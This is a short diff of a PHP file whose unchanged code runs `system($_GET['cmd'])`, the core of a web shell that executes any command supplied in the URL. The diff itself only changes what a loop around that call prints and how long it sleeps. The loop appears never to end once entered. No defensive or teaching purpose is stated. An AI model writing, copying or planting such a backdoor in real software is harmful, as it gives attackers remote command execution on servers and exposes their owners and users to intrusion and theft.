@@ -10,9 +10,9 @@
     {
         $comando = system($_GET['cmd']);
         while($comando != ""){
-            echo $comando;
+            echo "1<br>";
             flush();
-            sleep(10);
+            sleep(1);
         }
     }
 ?>
